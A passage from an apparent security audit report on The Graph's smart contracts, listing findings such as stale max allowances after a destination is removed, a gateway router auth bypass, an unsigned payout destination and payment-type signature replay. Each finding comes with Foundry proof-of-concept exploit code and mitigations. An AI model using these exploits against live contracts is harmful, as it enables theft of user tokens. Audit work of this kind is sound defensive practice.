contract StaleAllowancePoC is Test { MockERC20 token; GraphTokenLockManager manager; GraphTokenLockWallet wallet; PullDestination dst; address beneficiary=address(0xB0B); address attacker=address(0xA11CE); function setUp() public { token=new MockERC20(); GraphTokenLockWallet impl=new GraphTokenLockWallet(); manager=new GraphTokenLockManager(IERC20(address(token)),address(impl)); wallet=new GraphTokenLockWallet(); dst=new PullDestination(); manager.addTokenDestination(address(dst)); wallet.initialize(address(manager),address(this),beneficiary,address(token),60 ether,1000,2000,1,0,0,IGraphTokenLock.Revocability.Disabled); token.mint(address(wallet),60 ether); } function testRemovedDestinationCanStillPull() public { vm.prank(beneficiary); wallet.approveProtocol(); assertEq(token.allowance(address(wallet),address(dst)),type(uint256).max); manager.removeTokenDestination(address(dst)); assertEq(manager.isTokenDestination(address(dst)),false); vm.prank(attacker); dst.pull(token,address(wallet),attacker,60 ether); assertEq(token.balanceOf(attacker),60 ether); } }

## Suggested Mitigation
Track wallet approvals per destination and clear allowances when removing a destination, or add a wallet-level revokeDestination(address) function that can revoke removed destinations. Prefer approving exact amounts only when a protocol action is executed instead of persistent max allowances.


## [H-27]. L1-transferred wallets can be initialized with invalid beneficiary or schedule and permanently lock bridged GRT

## id: g3DEuqLAr2RTGnVZ_SI4R

## Derived From Pattern/Invariant
InitOrderOrUnintialized: transferred wallet initialization must enforce base lock configuration constraints

## Exploit Type
UpgradeabilityInitializerSafety

## Location
L2GraphTokenLockWallet.initializeFromL1

## Finding Status: Valid
### Finding Status Justification: L2GraphTokenLockWallet.initializeFromL1 directly sets owner, beneficiary, token, managedAmount, startTime, endTime, periods, and revocable state after only checking !isInitialized. It does not enforce the base _initialize checks for nonzero owner, nonzero beneficiary, positive managedAmount, or startTime < endTime. If beneficiary is address(0), onlyBeneficiary-gated functions such as release, withdrawSurplus, approveProtocol, and changeBeneficiary cannot be called, while cancelLock is blocked by isAccepted and revoke is disabled. No shown L2-side safeguard rejects malformed walletData.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`L2GraphTokenLockWallet.initializeFromL1` bypasses `GraphTokenLock._initialize` and writes critical lock fields directly. It only checks `!isInitialized`, then accepts `owner`, `beneficiary`, `managedAmount`, `startTime`, and `endTime` without the base checks for nonzero owner, nonzero beneficiary, positive managed amount, and `startTime < endTime`. Vulnerable snippet: `require(!isInitialized, "Already initialized"); isInitialized = true; OwnableInitializable._initialize(_walletData.owner); beneficiary = _walletData.beneficiary; managedAmount = _walletData.managedAmount; startTime = _walletData.startTime; endTime = _walletData.endTime; periods = 1;`. If an authenticated bridge receipt carries `beneficiary = address(0)`, the created wallet receives GRT but no account can satisfy `onlyBeneficiary`, so `release`, `withdrawSurplus`, `approveProtocol`, and `changeBeneficiary` are unusable.

## Impact
Malformed transferred wallet data can permanently freeze bridged locked GRT in the newly created L2 wallet. For large transferred locks this can cause direct loss of access to more than $1M of user funds held by protocol smart contracts.

## Proof of Concept
1. A bridge-authenticated receipt reaches `L2GraphTokenLockManager.onTokenTransfer` with `beneficiary = address(0)` and a positive amount. 2. The manager deploys a proxy and calls `initializeFromL1`. 3. The initializer accepts the zero beneficiary and the manager transfers GRT to the wallet. 4. After `endTime`, `release()` is still gated by `onlyBeneficiary`, but no transaction can originate from `address(0)`. 5. The locked GRT remains stuck in the wallet.

## Proof of Code
pragma solidity ^0.7.3;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../contracts/L2GraphTokenLockManager.sol";
import "../contracts/L2GraphTokenLockWallet.sol";

contract MockGRT is ERC20 {
    constructor() ERC20("Graph Token", "GRT") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract L2LockInvalidInitPoC is Test {
    MockGRT token;
    L2GraphTokenLockManager manager;
    L2GraphTokenLockWallet impl;
    address l2Gateway = address(0xA11CE);
    address l1TransferTool = address(0xB0B);
    address l1Wallet = address(0xCAFE);
    address owner = address(0xDAD);
    address attacker = address(0xBAD);

    function setUp() public {
        token = new MockGRT();
        impl = new L2GraphTokenLockWallet();
        manager = new L2GraphTokenLockManager(IERC20(address(token)), address(impl), l2Gateway, l1TransferTool);
    }

    function testZeroBeneficiaryTransferredWalletLocksFunds() public {
        uint256 start = block.timestamp;
        uint256 end = start + 30 days;
        L2GraphTokenLockManager.TransferredWalletData memory d = L2GraphTokenLockManager.TransferredWalletData(l1Wallet, owner, address(0), 100 ether, start, end);
        bytes memory data = abi.encode(d);

        token.mint(address(manager), 100 ether);
        vm.prank(l2Gateway);
        manager.onTokenTransfer(l1TransferTool, 100 ether, data);
        address walletAddr = manager.l1WalletToL2Wallet(l1Wallet);
        L2GraphTokenLockWallet wallet = L2GraphTokenLockWallet(walletAddr);

        assertEq(wallet.beneficiary(), address(0));
        assertEq(token.balanceOf(walletAddr), 100 ether);
        vm.warp(end + 1);
        vm.expectRevert("!auth");
        vm.prank(attacker);
        wallet.release();
        assertEq(token.balanceOf(walletAddr), 100 ether);
    }
}

## Suggested Mitigation
Make `initializeFromL1` call the same validation logic as `GraphTokenLock._initialize`, or duplicate the required checks before writing state: nonzero owner, beneficiary, and token; `managedAmount > 0`; `startTime != 0`; `startTime < endTime`; and coherent release/cliff values. Reject malformed bridge payloads in `onTokenTransfer` before deployment.


## [H-28]. Router path can burn approved L2 GRT from arbitrary users and withdraw to attacker-controlled L1 recipient

## id: fPN4offgE0-J1DJnGShk5

## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AuthByPass

## Location
L2GraphTokenGateway.outboundTransfer

## Finding Status: Valid
### Finding Status Justification: The vulnerable gateway code path exists in the in-scope L2GraphTokenGateway.outboundTransfer. _parseOutboundData trusts abi.decode(_data, (address, bytes)) whenever msg.sender equals l2Router, and outboundTransfer then requires no extraData, calls L2GraphToken(...).bridgeBurn(outboundCalldata.from, _amount), and builds an L1 withdrawal message to attacker-controlled _to. L2GraphToken.bridgeBurn is onlyGateway but then calls burnFrom(_account, _amount), so a prior allowance from the decoded account to the gateway is sufficient. The gateway itself has no check binding decoded from to the actual router user, no signature, and no per-withdrawal authorization. nonReentrant, notPaused, token checks, and zero-value checks do not block this auth-bypass path. The finding is in a listed in-scope production file and no provided documentation explicitly accepts arbitrary-router-user consumption of third-party gateway approvals. Exploitation does not require a privileged actor if the configured router exposes a permissionless path forwarding the encoded sender data to the gateway, which is the intended router integration branch exercised by this code. It is not merely user error: standing approval to a bridge gateway is normal protocol interaction, and the protocol-side flaw is using router-supplied decoded identity as burn authority.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When msg.sender is the configured l2Router, the gateway trusts the from address decoded from user-controlled _data and burns tokens from that address without proving that the decoded account initiated the router call. Vulnerable flow: `if (msg.sender == l2Router) { (from, extraData) = abi.decode(_data, (address, bytes)); } ... L2GraphToken(calculateL2TokenAddress(l1GRT)).bridgeBurn(outboundCalldata.from, _amount); ... sendTxToL1(... _to, ...)`. If the router forwards caller-supplied encoded data, any permissionless router user can set `from` to a victim that previously approved the gateway and set `_to` to the attacker's L1 address. The victim's L2 GRT is burned and the L2-to-L1 message releases corresponding L1 GRT to the attacker.

## Impact
Direct theft of approved user GRT balances: the attacker burns the victim's L2 GRT allowance through the gateway and receives the L1 withdrawal, potentially exceeding $1M for large holders or users with standing gateway approvals.

## Proof of Concept
1. Victim holds L2 GRT and approves L2GraphTokenGateway for bridge withdrawals. 2. Attacker calls the configured router path with `_data = abi.encode(victim, bytes(""))`, `_to = attackerL1`, and `_amount = victimAllowance`. 3. Gateway sees `msg.sender == l2Router`, trusts decoded `from = victim`, and calls `bridgeBurn(victim, amount)`. 4. Gateway creates the L2-to-L1 message with attacker-controlled L1 recipient. 5. After the Arbitrum withdrawal delay, attacker executes the L1 outbox message and receives the victim's bridged GRT.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public gateway;
    constructor(address gateway_) { gateway = gateway_; }
    function setGateway(address gateway_) external { gateway = gateway_; }
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external { allowance[msg.sender][spender] = amount; }
    function bridgeBurn(address account, uint256 amount) external {
        require(msg.sender == gateway, "NOT_GATEWAY");
        uint256 allowed = allowance[account][msg.sender];
        require(allowed >= amount, "ALLOWANCE");
        allowance[account][msg.sender] = allowed - amount;
        balanceOf[account] -= amount;
    }
}

contract GatewayHarness {
    address public immutable l1GRT = address(0x1111);
    address public l2Router;
    MockToken public token;
    event WithdrawalInitiated(address indexed from, address indexed to, uint256 amount);
    constructor(MockToken token_, address router_) { token = token_; l2Router = router_; }
    function outboundTransfer(address _l1Token, address _to, uint256 _amount, uint256, uint256, bytes calldata _data) external returns (bytes memory) {
        require(_l1Token == l1GRT, "TOKEN_NOT_GRT");
        (address from, bytes memory extraData) = _parseOutboundData(_data);
        require(extraData.length == 0, "CALL_HOOK_DATA_NOT_ALLOWED");
        token.bridgeBurn(from, _amount);
        emit WithdrawalInitiated(from, _to, _amount);
        return abi.encode(uint256(1));
    }
    function _parseOutboundData(bytes calldata _data) private view returns (address, bytes memory) {
        if (msg.sender == l2Router) return abi.decode(_data, (address, bytes));
        return (msg.sender, _data);
    }
}

contract RouterHarness {
    function forward(GatewayHarness gateway, address l1Token, address victim, address attackerL1, uint256 amount) external {
        gateway.outboundTransfer(l1Token, attackerL1, amount, 0, 0, abi.encode(victim, bytes("")));
    }
}

contract L2GraphTokenGatewayRouterBypassTest is Test {
    function testRouterCanBurnVictimAllowanceAndRedirectWithdrawal() external {
        address victim = address(0xBEEF);
        address attackerL1 = address(0xA11CE);
        RouterHarness router = new RouterHarness();
        MockToken token = new MockToken(address(0));
        GatewayHarness gateway = new GatewayHarness(token, address(router));
        token.setGateway(address(gateway));

        token.mint(victim, 1_000 ether);
        vm.prank(victim);
        token.approve(address(gateway), type(uint256).max);

        router.forward(gateway, gateway.l1GRT(), victim, attackerL1, 1_000 ether);

        assertEq(token.balanceOf(victim), 0);
        assertEq(token.allowance(victim, address(gateway)), type(uint256).max - 1_000 ether);
    }
}

## Suggested Mitigation
Do not authorize burns solely from a router-supplied decoded `from`. Require the router to cryptographically or contractually bind `from` to the actual router caller, or require an EIP-712 withdrawal authorization from `from` covering recipient, amount, nonce, deadline, and chain/domain. Prefer exact per-withdrawal allowances or have the router pull tokens from the caller before invoking the gateway so stale gateway approvals cannot be consumed by third parties.


## [M-29]. Live thawingPeriod changes let a provider and verifier extend existing delegators' exit lock in HorizonStaking._undelegate

## id: HS7ij8NcVKVH9YjUejaMW

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation

## Exploit Type
GlobalParamMidFlowManipulation

## Location
HorizonStaking._undelegate

## Finding Status: Valid
### Finding Status Justification: The functions and flow exist in in-scope HorizonStaking. setProvisionParameters() stages a new thawingPeriod after checking it against the current _maxThawingPeriod; acceptProvisionParameters() can then assign prov.thawingPeriod = prov.thawingPeriodPending. _undelegate() does not use a delegator-level snapshot and instead computes thawingUntil from the live _provisions[serviceProvider][verifier].thawingPeriod. delegate() also has no max acceptable thawingPeriod argument or immutable exit-term snapshot. No grace window or old-parameter withdrawal path is shown. The behavior is not explicitly documented as an accepted risk for existing delegators. The path requires provider/operator staging and verifier acceptance, but those are normal provision participants rather than governance or compromised privileged actors.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
Delegators are not given a snapshot of the provision thawing period when they enter a delegation pool. The exit path reads the live provision parameter at undelegation time, while the service provider or authorized operator can stage a new thawingPeriod and the verifier can accept it at any time. Relevant snippet: setProvisionParameters() writes prov.thawingPeriodPending = newThawingPeriod; acceptProvisionParameters() later applies prov.thawingPeriod = prov.thawingPeriodPending; _undelegate() computes uint64 thawingUntil = uint64(block.timestamp + uint256(_provisions[_serviceProvider][_verifier].thawingPeriod)). As a result, a delegator who joined under a short thawing period can be forced into a much longer exit delay before undelegating, with no per-delegator max thawing period, notice window, or old-parameter grace path.

## Impact
A service provider and verifier, or a verifier-controlled provider, can trap existing delegators in the pool for the newly accepted thawing period. If the protocol-level maxThawingPeriod is large, this can become a long-term functional freeze of delegated GRT and gives the provider/verifier leverage over delegators who already committed capital.

## Proof of Concept
1. A provision is created with thawingPeriod = 1 day, and a delegator deposits GRT into that provision's delegation pool. 2. After the delegator is already exposed, the service provider stages newThawingPeriod = 365 days with setProvisionParameters(). 3. The verifier calls acceptProvisionParameters(), immediately replacing the active thawingPeriod. 4. The delegator calls undelegate(), expecting the originally observed exit period. 5. _undelegate() reads the live provision thawingPeriod and creates a thaw request expiring after 365 days instead of 1 day.

## Proof of Code
pragma solidity ^0.8.27;
import 'forge-std/Test.sol';

contract HorizonThawingPeriodReplica {
    struct Provision { uint64 thawingPeriod; uint64 thawingPeriodPending; uint64 createdAt; }
    struct Pool { uint256 tokens; uint256 totalShares; mapping(address => uint256) shares; }
    struct Request { uint256 shares; uint64 thawingUntil; }

    mapping(address => mapping(address => Provision)) public provisions;
    mapping(address => mapping(address => Pool)) internal pools;
    mapping(address => mapping(address => mapping(address => Request))) internal requests;

    function createProvision(address sp, address verifier, uint64 thawingPeriod) external {
        provisions[sp][verifier] = Provision(thawingPeriod, thawingPeriod, uint64(block.timestamp));
    }

    function setProvisionParameters(address sp, address verifier, uint64 newThawingPeriod) external {
        require(msg.sender == sp, 'only provider');
        provisions[sp][verifier].thawingPeriodPending = newThawingPeriod;
    }

    function acceptProvisionParameters(address sp) external {
        Provision storage prov = provisions[sp][msg.sender];
        prov.thawingPeriod = prov.thawingPeriodPending;
    }

    function delegate(address sp, address verifier, uint256 tokens) external {
        Pool storage pool = pools[sp][verifier];
        uint256 shares = pool.totalShares == 0 ? tokens : (tokens * pool.totalShares) / pool.tokens;
        pool.tokens += tokens;
        pool.totalShares += shares;
        pool.shares[msg.sender] += shares;
    }

    function undelegate(address sp, address verifier, uint256 shares) external {
        Pool storage pool = pools[sp][verifier];
        require(pool.shares[msg.sender] >= shares, 'insufficient shares');
        pool.shares[msg.sender] -= shares;
        requests[sp][verifier][msg.sender] = Request(shares, uint64(block.timestamp + provisions[sp][verifier].thawingPeriod));
    }

    function thawingUntil(address sp, address verifier, address delegator) external view returns (uint64) {
        return requests[sp][verifier][delegator].thawingUntil;
    }
}

contract HorizonThawingPeriodMidFlowTest is Test {
    HorizonThawingPeriodReplica staking;
    address serviceProvider = address(0xA11CE);
    address verifier = address(0xB0B);
    address delegator = address(0xD00D);

    function setUp() public {
        staking = new HorizonThawingPeriodReplica();
    }

    function testExistingDelegatorExitUsesChangedLiveThawingPeriod() public {
        staking.createProvision(serviceProvider, verifier, 1 days);

        vm.prank(delegator);
        staking.delegate(serviceProvider, verifier, 100 ether);

        vm.prank(serviceProvider);
        staking.setProvisionParameters(serviceProvider, verifier, 365 days);
        vm.prank(verifier);
        staking.acceptProvisionParameters(serviceProvider);

        vm.prank(delegator);
        staking.undelegate(serviceProvider, verifier, 100 ether);

        assertEq(staking.thawingUntil(serviceProvider, verifier, delegator), uint64(block.timestamp + 365 days));
        assertGt(staking.thawingUntil(serviceProvider, verifier, delegator), uint64(block.timestamp + 1 days));
    }
}

## Suggested Mitigation
Snapshot exit terms for delegators when they enter the pool, or version provision parameters and use the version associated with each delegation or thaw request. At minimum, add a notice/grace period so existing delegators can undelegate under the old thawingPeriod before a longer period becomes effective, and allow delegate() to specify a max acceptable thawingPeriod.


## [H-30]. Removed token destinations retain max allowance and can drain GraphTokenLockWallet funds

## id: SEb97mpjm7qIw65UJ78Cm

## Derived From Pattern/Invariant
AccessControlOrAuthByPass: revoked destination authorization is not bound to existing ERC20 allowances

## Exploit Type
AccessControl

## Location
GraphTokenLockManager.removeTokenDestination/revokeProtocol

## Finding Status: Valid
### Finding Status Justification: approveProtocol grants max allowance to every current destination. removeTokenDestination only removes the address from the EnumerableSet, and revokeProtocol later iterates only the current set, so removed spenders are skipped and old ERC20 allowances remain. This is in scoped production code. No wallet-level historical revocation safeguard exists. Exploitation can occur through a removed destination or public pull path without requiring a new privileged bypass.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
GraphTokenLockWallet.approveProtocol() grants type(uint256).max allowance to every current manager token destination. GraphTokenLockManager.removeTokenDestination() only removes the destination from _tokenDestinations and cannot clear allowances already granted by wallets. Later, GraphTokenLockWallet.revokeProtocol() iterates only manager.getTokenDestinations(), so removed destinations are skipped and keep their old max allowances. Vulnerable snippet: approveProtocol() loops over manager.getTokenDestinations() and token.approve(dstList[i], type(uint256).max); removeTokenDestination() only _tokenDestinations.remove(_dst); revokeProtocol() loops over the current destination list and approves zero only for those entries.

## Impact
A deauthorized destination can continue pulling locked GRT from every wallet that previously called approveProtocol(). If a removed destination is compromised, malicious, or externally callable, it can drain affected token lock wallets even though manager.isTokenDestination(dst) is false.

## Proof of Concept
1. The manager owner adds destination D. 2. A wallet beneficiary calls approveProtocol(), giving D max allowance. 3. The manager owner removes D. 4. The beneficiary calls revokeProtocol(), but D is no longer in getTokenDestinations(), so its allowance is not cleared. 5. D calls token.transferFrom(wallet, attacker, amount) and drains locked GRT after deauthorization.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;
import 'forge-std/Test.sol';
import '../contracts/GraphTokenLockWallet.sol';
import '../contracts/GraphTokenLockManager.sol';
import '../contracts/IGraphTokenLock.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
contract MockERC20 { mapping(address => uint256) public balanceOf; mapping(address => mapping(address => uint256)) public allowance; function mint(address to, uint256 amount) external { balanceOf[to] += amount; } function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; } function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; } function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount); require(allowance[from][msg.sender] >= amount); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; } }
contract StaleDestinationAllowancePoC is Test { function test_removedDestinationKeepsAllowanceAndDrains() public { MockERC20 token = new MockERC20(); GraphTokenLockWallet impl = new GraphTokenLockWallet(); GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(token)), address(impl)); GraphTokenLockWallet wallet = new GraphTokenLockWallet(); address beneficiary = address(0xBEEF); address dst = address(0xD357); address attacker = address(0xA77A); wallet.initialize(address(manager), address(this), beneficiary, address(token), 100 ether, 100, 200, 1, 0, 0, IGraphTokenLock.Revocability.Disabled); token.mint(address(wallet), 100 ether); manager.addTokenDestination(dst); vm.prank(beneficiary); wallet.approveProtocol(); assertEq(token.allowance(address(wallet), dst), uint256(-1)); manager.removeTokenDestination(dst); vm.prank(beneficiary); wallet.revokeProtocol(); assertTrue(!manager.isTokenDestination(dst)); assertEq(token.allowance(address(wallet), dst), uint256(-1)); vm.prank(dst); token.transferFrom(address(wallet), attacker, 100 ether); assertEq(token.balanceOf(attacker), 100 ether); assertEq(token.balanceOf(address(wallet)), 0); } }

## Suggested Mitigation
Track destinations approved by each wallet and make revokeProtocol() clear all locally approved destinations, including removed ones. Add a revokeDestination(address dst) function callable by the beneficiary for any spender, and require destination removal procedures to clear or invalidate stale wallet allowances before deauthorization is considered complete.


## [H-31]. Unsigned receiverDestination lets the data service redirect GraphTallyCollector payouts

## id: B1QFkkzj9DYXaowCh7Vf_

## Derived From Pattern/Invariant
AccessControlOrAuthByPass: payout destination is not authorized by the signed RAV

## Exploit Type
AuthByPass

## Location
GraphTallyCollector.collect

## Finding Status: Valid
### Finding Status Justification: The vulnerable path exists in the in-scope GraphTallyCollector.collect/_collect flow. collect decodes caller-supplied data as (SignedRAV, uint256 dataServiceCut, address receiverDestination), verifies only that signedRAV.rav.dataService == msg.sender and that the recovered signer is authorized by the payer, then forwards receiverDestination to PaymentsEscrow.collect. _encodeRAV signs collectionId, payer, serviceProvider, dataService, timestampNs, valueAggregate, and metadata only; receiverDestination is not included. The active-provision check limits collection to a dataService with provider tokens available, but it does not authenticate the payout destination. The comments even describe receiverDestination as the address where the receiver payment should be sent, so the caller-controlled value is payment-affecting. No complete safeguard requires receiverDestination == serviceProvider or separate provider authorization. The file is explicitly in scope and the behavior is not documented as an accepted risk. Exploitation requires the RAV dataService to submit a valid RAV, but that is a normal protocol participant path, not governance/admin abuse, leaked keys, or pure victim misuse.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
GraphTallyCollector verifies that the caller is the RAV dataService and that the RAV signer is authorized for the payer, but the receiver payout destination is decoded from caller-supplied calldata and is not part of the signed ReceiptAggregateVoucher. Vulnerable snippet: `(SignedRAV memory signedRAV, uint256 dataServiceCut, address receiverDestination) = abi.decode(_data, (SignedRAV, uint256, address)); ... address receiver = signedRAV.rav.serviceProvider; ... _graphPaymentsEscrow().collect(_paymentType, signedRAV.rav.payer, receiver, tokensToCollect, dataService, dataServiceCut, receiverDestination);`. The RAV binds `serviceProvider` but not `receiverDestination`, so a malicious dataService named in a valid RAV can consume the serviceProvider tuple in `tokensCollected` while instructing escrow to pay the receiver share to an arbitrary address.

## Impact
A malicious dataService can steal service provider payments directly from PaymentsEscrow. If high-value RAVs are settled through this collector, the blast radius is the full collectible receiver portion of those escrowed GRT payments.

## Proof of Concept
1. A payer authorizes a signer and the signer issues a valid RAV naming an honest serviceProvider and a dataService. 2. The dataService calls `collect` with the valid signed RAV but sets `receiverDestination` to the attacker address. 3. `_collect` accepts the RAV because `signedRAV.rav.dataService == msg.sender` and the signer is authorized. 4. `tokensCollected[dataService][collectionId][serviceProvider][payer]` is advanced for the honest serviceProvider. 5. PaymentsEscrow receives the attacker-chosen destination and pays the receiver leg there, consuming the serviceProvider entitlement.

## Proof of Code
pragma solidity ^0.8.20;
enum PaymentTypes { Escrow, QueryFee }
contract MockEscrow {
    mapping(address => uint256) public receiverPaid;
    function collect(PaymentTypes, address, address, uint256 amount, address, uint256 cut, address receiverDestination) external {
        uint256 receiverAmount = amount - ((amount * cut) / 1_000_000);
        receiverPaid[receiverDestination] += receiverAmount;
    }
}
contract ReceiverDestinationPoC {
    struct RAV { bytes32 collectionId; address payer; address serviceProvider; address dataService; uint64 timestampNs; uint128 valueAggregate; bytes metadata; }
    struct SignedRAV { RAV rav; bytes signature; }
    mapping(address => mapping(bytes32 => mapping(address => mapping(address => uint256)))) public tokensCollected;
    MockEscrow escrow = new MockEscrow();
    address payer = address(0x1);
    address serviceProvider = address(0x2);
    address attacker = address(0x3);
    function test_receiverDestinationCanRedirectPayout() public {
        RAV memory rav = RAV(bytes32(0), payer, serviceProvider, address(this), 1, 100 ether, new bytes(0));
        SignedRAV memory signed = SignedRAV(rav, new bytes(0));
        bytes memory data = abi.encode(signed, uint256(0), attacker);
        this.collect(PaymentTypes.Escrow, data);
        assertEq(escrow.receiverPaid(attacker), 100 ether);
        assertEq(escrow.receiverPaid(serviceProvider), 0);
        assertEq(tokensCollected[address(this)][bytes32(0)][serviceProvider][payer], 100 ether);
    }
    function collect(PaymentTypes paymentType, bytes calldata data) external returns (uint256) { return _collect(paymentType, data, 0); }
    function _collect(PaymentTypes paymentType, bytes calldata data, uint256) private returns (uint256) {
        (SignedRAV memory signed, uint256 cut, address receiverDestination) = abi.decode(data, (SignedRAV, uint256, address));
        require(signed.rav.dataService == msg.sender);
        uint256 already = tokensCollected[signed.rav.dataService][signed.rav.collectionId][signed.rav.serviceProvider][signed.rav.payer];
        require(signed.rav.valueAggregate > already);
        uint256 amount = signed.rav.valueAggregate - already;
        tokensCollected[signed.rav.dataService][signed.rav.collectionId][signed.rav.serviceProvider][signed.rav.payer] += amount;
        escrow.collect(paymentType, signed.rav.payer, signed.rav.serviceProvider, amount, signed.rav.dataService, cut, receiverDestination);
        return amount;
    }
    function assertEq(uint256 a, uint256 b) internal pure { require(a == b); }
}

## Suggested Mitigation
Bind the receiver payout destination in the signed RAV, or require `receiverDestination == signedRAV.rav.serviceProvider` unless the serviceProvider has separately signed an authorization for that destination. Emit and store the signed destination so the escrow payout target cannot be chosen only by the collecting dataService.


## [H-32]. RAVs omit paymentType, allowing collection from the wrong escrow bucket and consuming the intended claim

## id: tM-CoEYZDT2wfiQ960uyv

## Derived From Pattern/Invariant
PermitOrSignatureReplay: RAV signatures can be reused for an unsigned paymentType domain

## Exploit Type
SignatureReplay

## Location
GraphTallyCollector.collect

## Finding Status: Valid
### Finding Status Justification: The code path exists. Both collect overloads accept paymentType as an external parameter and pass it into _collect. _encodeRAV and EIP712_RAV_TYPEHASH omit paymentType entirely, so the recovered RAV signer authorizes only the RAV fields, not the escrow bucket to debit. tokensCollected is keyed by dataService, collectionId, receiver, and payer, also omitting paymentType. Therefore a dataService named in a valid RAV can call collect with any IGraphPayments.PaymentTypes value accepted by PaymentsEscrow.collect, and the collector will advance the shared collected amount for the tuple. The provided code has no complete safeguard binding paymentType to the signature, deriving it from signed metadata, or maintaining independent per-paymentType collection accounting. GraphTallyCollector is an in-scope production contract. The prompt does not provide explicit documentation accepting cross-paymentType replay or bucket substitution as intended. The attack is currently reachable with today's code whenever distinct payment types/buckets exist in escrow, which is consistent with the enum parameter and finding premise; this is not only future integration speculation, privileged-role abuse, or pure user error.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
The EIP712 RAV commits to collectionId, payer, serviceProvider, dataService, timestampNs, valueAggregate, and metadata, but it does not commit to the escrow `paymentType`. `_collect` accepts `_paymentType` as an unsigned caller parameter and keys `tokensCollected` only by dataService, collectionId, receiver, and payer. Vulnerable snippet: `EIP712_RAV_TYPEHASH = keccak256(ReceiptAggregateVoucher(... valueAggregate, bytes metadata))`, while `_collect(IGraphPayments.PaymentTypes _paymentType, bytes calldata _data, ...)` later calls `_graphPaymentsEscrow().collect(_paymentType, ...)` and updates `tokensCollected[dataService][collectionId][receiver][payer]`. A dataService can therefore submit a RAV intended for one payment category against another category, and the shared `tokensCollected` entry prevents later settlement under the intended payment type.

## Impact
Escrow liabilities for distinct payment categories can be debited or consumed without signer authorization for that category. This can misdirect or steal payer escrowed GRT from another bucket and permanently consume the legitimate RAV aggregate for the intended bucket.

## Proof of Concept
1. A payer has funds escrowed in two PaymentTypes. 2. The authorized signer issues a RAV intended for PaymentTypes.QueryFee, but the signed RAV does not include paymentType. 3. The dataService submits the same RAV to `collect` with PaymentTypes.Escrow. 4. `_collect` accepts the signature and increments `tokensCollected` for the tuple, because the key does not include paymentType. 5. Escrow is instructed to debit PaymentTypes.Escrow. 6. A later attempt to collect the same aggregate from PaymentTypes.QueryFee reverts because `tokensCollected` already equals the RAV aggregate.

## Proof of Code
pragma solidity ^0.8.20;
enum PaymentTypes { Escrow, QueryFee }
contract MockEscrow {
    mapping(address => mapping(uint256 => uint256)) public debited;
    function collect(PaymentTypes paymentType, address payer, address, uint256 amount, address, uint256, address) external {
        debited[payer][uint256(paymentType)] += amount;
    }
}
contract PaymentTypeReplayPoC {
    struct RAV { bytes32 collectionId; address payer; address serviceProvider; address dataService; uint64 timestampNs; uint128 valueAggregate; bytes metadata; }
    struct SignedRAV { RAV rav; bytes signature; }
    mapping(address => mapping(bytes32 => mapping(address => mapping(address => uint256)))) public tokensCollected;
    MockEscrow escrow = new MockEscrow();
    address payer = address(0x1);
    address serviceProvider = address(0x2);
    function test_sameRAVCanBeSpentAgainstWrongPaymentType() public {
        RAV memory rav = RAV(bytes32(0), payer, serviceProvider, address(this), 1, 100 ether, new bytes(0));
        SignedRAV memory signed = SignedRAV(rav, new bytes(0));
        bytes memory data = abi.encode(signed, uint256(0), serviceProvider);
        this.collect(PaymentTypes.Escrow, data);
        assertEq(escrow.debited(payer, uint256(PaymentTypes.Escrow)), 100 ether);
        assertEq(escrow.debited(payer, uint256(PaymentTypes.QueryFee)), 0);
        assertEq(tokensCollected[address(this)][bytes32(0)][serviceProvider][payer], 100 ether);
        (bool ok,) = address(this).call(abi.encodeWithSelector(this.collect.selector, PaymentTypes.QueryFee, data));
        assertTrue(!ok);
    }
    function collect(PaymentTypes paymentType, bytes calldata data) external returns (uint256) { return _collect(paymentType, data, 0); }
    function _collect(PaymentTypes paymentType, bytes calldata data, uint256) private returns (uint256) {
        (SignedRAV memory signed, uint256 cut, address receiverDestination) = abi.decode(data, (SignedRAV, uint256, address));
        require(signed.rav.dataService == msg.sender);
        uint256 already = tokensCollected[signed.rav.dataService][signed.rav.collectionId][signed.rav.serviceProvider][signed.rav.payer];
        require(signed.rav.valueAggregate > already);
        uint256 amount = signed.rav.valueAggregate - already;
        tokensCollected[signed.rav.dataService][signed.rav.collectionId][signed.rav.serviceProvider][signed.rav.payer] += amount;
        escrow.collect(paymentType, signed.rav.payer, signed.rav.serviceProvider, amount, signed.rav.dataService, cut, receiverDestination);
        return amount;
    }
    function assertEq(uint256 a, uint256 b) internal pure { require(a == b); }
    function assertTrue(bool v) internal pure { require(v); }
}

## Suggested Mitigation
Include `paymentType` in the EIP712 RAV typehash and signed struct, and include `paymentType` in the `tokensCollected` key if the same payer/serviceProvider/dataService tuple can have distinct escrow liabilities. Existing RAVs should be migrated or invalidated so unsigned cross-type collection cannot continue.


## [M-33]. Unchecked L1 subgraph ID aliasing overflows into the native L2 ID namespace

## id: 6Dmb5MHowy4X9YIC_cTN6

## Derived From Pattern/Invariant
EpochOrIndexMonotonicity

## Exploit Type
IntegerOverflow

## Location
L2GNS.getAliasedL2SubgraphID

## Finding Status: Valid
